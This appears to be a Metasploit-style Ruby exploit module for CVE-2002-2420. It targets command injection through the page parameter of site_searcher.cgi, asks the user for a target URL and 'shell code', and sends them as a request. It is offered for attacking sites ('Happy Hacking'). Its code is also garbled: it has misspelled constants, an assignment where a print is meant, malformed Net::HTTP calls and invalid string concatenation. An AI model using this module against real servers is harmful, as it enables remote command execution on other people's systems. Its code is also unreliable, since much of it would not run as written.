##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##



#Reference OF CV3 2002-2420


#===> https://www.exploit-db.com/exploits/21768




#Code By Krd-Pentester


require 'net/http'

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExellentRanking

  def initialize(info={})
    super(update_info(info,
      'Name'           => "site_searcher.cgi",
      'Description'    => %q{
        
        site_searcher.cgi in Super Site Searcher allows remote attackers to execute arbitrary commands via shell metacharacters in the page parameter.

      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Diyar Krd [Krd-Pentester]' ],
      'References'     =>
        [
          [ 'https://www.cvedetails.com/cve/CVE-2002-2420/', 'CVE Information' ]
        ],
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'PHP site_searcher.cgi',
            {
              'Ret' => 0x41414141 #
            }
          ]
        ],
      'Payload'        =>
        {
          'BadChars' => "\x00"
        },
      'Privileged'     => false,
      'DisclosureDate' => "",
      'DefaultTarget'  => 0))



    register_options(



    	[


 	 	OptString.new("URL",[true,"Happy Hacking With Your URL Target :) "]),


 	 ],self.class)


  end


  def url
  	puts "Enter The URL =>"
  	name = gets
  	puts "Enter The Search Engine => "
  	path = gets
  	puts = "Enter The Shell Code => "
  	shell = gets
  	datastore['URL'] || source = Net:HTTP.get(name,'/',+path+,''/site_searcher.cgi?page='+shell')


  end
end

